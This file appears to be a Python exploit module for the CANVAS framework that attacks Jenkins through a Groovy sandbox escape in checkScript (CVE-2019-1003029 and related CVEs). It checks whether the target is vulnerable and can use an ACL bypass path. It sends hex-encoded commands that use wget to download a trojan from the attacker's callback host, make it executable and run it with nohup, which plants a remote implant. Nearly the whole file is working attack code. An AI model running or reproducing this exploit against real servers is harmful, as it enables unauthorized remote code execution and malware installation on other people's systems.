#!/usr/bin/env python2
import sys
import time
import threading
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager
from ExploitTypes.CommandLineExecuter import CommandExploit

from libs.spkproxy import urlopen
from libs.canvasos import canvasos



NAME                            = 'RCE on Jenkins checkScript'
DESCRIPTION                     = 'RCE on Jenkins checkScript'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Jenkins"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-1003029 CVE-2019-1003005 CVE-2018-1000861'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-1003029 http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-1003005 http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-1000861"
DOCUMENTATION["References"]     = "https://jenkins.io/security/advisory/2019-03-06/#SECURITY-1338"
DOCUMENTATION["Date public"]    = "17/05/2019"
DOCUMENTATION["NOTES"]          = """

Groovy Plugin supports sandboxed Groovy expressions for its 'System Groovy' functionality.
Its sandbox protection could be circumvented during parsing, compilation, and script instantiation by providing a crafted Groovy script.

IMPORTANT:
 * Sometimes an exception is generated during the exploitation of a vulnerable target,
   if this happens an error message will be shown and you should re-run the module.

 * The module creates a local webserver for the exploit proccess, so it's necessary that both the target and CANVAS have mutual visibility.

Vulnerable versions:
 * < 2.138 (with ANONYMOUS_READ disabled)
 * < build time 2019-01-28 (with ANONYMOUS_READ enabled)

Tested on:
 * Ubuntu 18.10, Jenkins 2.122
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Serverside"
PROPERTY['ARCH']                = [ ["UNIX"] ]
PROPERTY['VERSION']             = []

# TARGETS = { 0 : ['PHP']}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.payloadType = 0

        self.host = ""
        self.hostname = ''
        self.port = 80
        self.https = False
        self.hostname = None
        self.path = ''
        self.ua = None

        self.bypass_path   = '/securityRealm/user/admin/'
        self.endpoint_path = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
        self.need_bypass   = False

        self.basicauth_user = ""
        self.basicauth_password = ""

        # CommandExploit
        self.supports_universal = True

        # webserver config
        self.webserverport = 8080
        self.trojan_name   = randomstring(4)
        self.output_dir    = '/tmp/'
        self.webserverdata = ''
        self.arch          = None

    def neededListenerTypes(self):
       return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.path = self.path.strip('/')

        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.basicauth = self.basicauth_user != ''

        self.blind = True

        if self.hostname == '' or self.hostname is None:
            raise MissingHostname

    def send_request(self, url, query_string, auth):
        headers = []
        logging.debug('URL: ' + url + query_string)
        (fd, code) = urlopen(url + query_string,
                     verb='GET',
                     exploit=self,
                     hostname=self.hostname,
                     auth=auth,
                     extraheaders=headers,
                     noresponse=False,
                     entireresponse=True,
                     return_response_code=True
                    )
        return (fd.read(), code)

    def build_url(self,  path=''):
        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += path if path else '/'
        return target

    def build_payload(self, cmd):
        clsname = randomstring(4)
        payload = 'public class %s{public %s(){new String("CMD".decodeHex()).execute()}}' % (clsname, clsname)
        return payload.replace("CMD", cmd.encode('hex'))

    def send_payload(self, cmd):
        auth = None
        path = ''
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        if self.need_bypass:
            path += self.bypass_path

        path += self.endpoint_path

        url = self.build_url(path=path)
        payload = self.build_payload(cmd)
        query_string = '?sandbox=True&value=' + urlencode(payload)
        response, code = self.send_request(url, query_string, auth)
        return code == 200 and 'error' not in response

    def check_if_vulnerable(self):
        auth = None
        path = ''
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = self.build_url()
        response, code = self.send_request(url, '', auth)

        if code == 200 and 'adjuncts' in response:
            self.need_bypass = False
            return True
        elif code == 403:
            response, code = self.send_request(url + self.bypass_path, '', auth)
            if code == 200 and 'adjuncts' in response:
                self.need_bypass = True
                return True
        else:
            return False

    def init_webserver(self, data):
        self.webserverdata = data
        t = threading.Thread(target=self.set_up_webserver)
        t.setDaemon(True)
        t.start()

    def detect_arch(self):
        try:
            s = self.gettcplistener(self.webserverport + 1, timeout=15.0)
            client, _ = s.accept()
            data = client.recv(256)  # GET /ARCH HTTP/1.1 ...
            arch = data.split(' ')[1].strip('/')
            if arch.lower() == 'x86_64':
                self.arch = 'X64'
            else:
                self.arch = 'X86'
            client.close()
            s.close()
        except:
            logging.error('Failed to detect architecture')


    def download_and_execute(self):
        full_path    = self.output_dir + randomstring(3)
        cmd_download = 'wget http://%s:%d/ -O %s' % (self.callback.ip, self.webserverport, full_path)
        cmd_chmod    = 'chmod +x %s' % full_path
        cmd_execute  = 'nohup %s &' % full_path

        self.setProgress(66)

        # detect arch
        t = threading.Thread(target=self.detect_arch)
        t.setDaemon(True)
        t.start()
        time.sleep(1.0)

        logging.info('Detecting architecture')
        data = 'wget http://%s:%d/$(uname -m) -O /dev/null' % (self.callback.ip, self.webserverport + 1)
        self.init_webserver(data)

        is_ok = False
        if self.send_payload(cmd_download):
            time.sleep(1.0)
            if self.send_payload(cmd_chmod):
                time.sleep(1.0)
                if  self.send_payload(cmd_execute):
                    for i in range(150):
                        if self.arch != None:
                            is_ok = True
                            break

                        time.sleep(0.1)

        if not is_ok:
            logging.error('Unable to determine architecture, aborting...')
            return False
        else:
            logging.info('Architecture detected: %s' % self.arch)

        full_path    = self.output_dir + self.trojan_name
        cmd_download = 'wget http://%s:%d/ -O %s' % (self.callback.ip, self.webserverport, full_path)
        cmd_chmod    = 'chmod +x %s' % full_path
        cmd_execute  = 'nohup %s &' % full_path

        self.init_webserver(self.makedownloadfile())

        if self.send_payload(cmd_download):
            time.sleep(1.0)
            if self.send_payload(cmd_chmod):
                time.sleep(1.0)
                if not self.send_payload(cmd_execute):
                    logging.critical('cmd_execute execution failed')
                    return False
                return True
            else:
                logging.critical('cmd_chmod execution failed')
                return False
        else:
            logging.critical('cmd_download execution failed')
            return False

    def set_up_webserver(self):
        app = self.engine.getModuleExploit("httpserver")

        app.link(self)
        app.argsDict["port"]          = self.webserverport
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["sourcedata"]    = self.webserverdata
        app.HTTPMOSDEF                = False
        app.singleshot                = True
        app.response_threshold        = 1
        app.callback                  = None

        self.manager = exploitmanager(app, self.engine)
        self.manager.setDaemon(True)
        self.manager.run()

    def makedownloadfile(self):
        logging.debug('Creating mosdef payload')
        logging.debug('\tIP: {}\tPort: {}'.format(self.callback.ip, self.callback.port))

        t_os = canvasos("Linux")
        t_os.arch = self.arch

        ret = self.buildmosdeftrojan(self.callback.ip,
                                     self.callback.port,
                                     target_os=t_os,
                                     universal=True)
        
        return self.mosdeftrojan


    def run(self):
        result = False
        self.setProgress(0)
        self.getargs()
        # self.getargs_cle()

        self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))
        logging.info("Checking if target is vulnerable")

        self.setProgress(33)

        if self.check_if_vulnerable():
            logging.warning("Target appears to be vulnerable")
            if self.download_and_execute():
                result = True
        else:
            logging.error("Target %s is not vulnerable" % self.host)

        if result:
            self.setProgress(100)
            self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
            return True
        else:
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

